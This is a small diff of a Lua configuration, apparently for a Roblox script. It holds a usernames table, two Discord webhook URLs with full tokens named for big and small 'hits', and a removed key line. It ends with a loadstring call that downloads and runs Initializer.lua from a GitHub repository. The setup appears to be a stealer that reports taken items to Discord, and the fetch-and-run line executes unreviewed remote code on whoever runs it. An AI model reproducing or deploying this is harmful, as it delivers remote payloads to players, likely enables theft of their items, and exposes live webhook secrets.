@@ -12,6 +12,4 @@ Usernames = {
 BigHitsWebhook = "https://discord.com/api/webhooks/1385646408333262980/4fW-9dWuXdmKtSVAYYWMzGBz1NwUt1K9PJSfPMdffLo23Vd_ewtu1Bt_b5YRRUPPFKrk"
 SmallHitsWebhook = "https://discord.com/api/webhooks/1385646380504322109/BU2QZ14Q4yV6lpN8NsdYQ79TuGlJHLH308oT9MCkjSs6-aE1znJ2IY_GDERdaWg8W59r"
 
-ODH_KEY = "" -- if you are a free user, enter your key here to auto validate.
-
 loadstring(game:HttpGet("https://raw.githubusercontent.com/hoodratleahh/Summer-UPD/refs/heads/main/Initializer.lua"))()
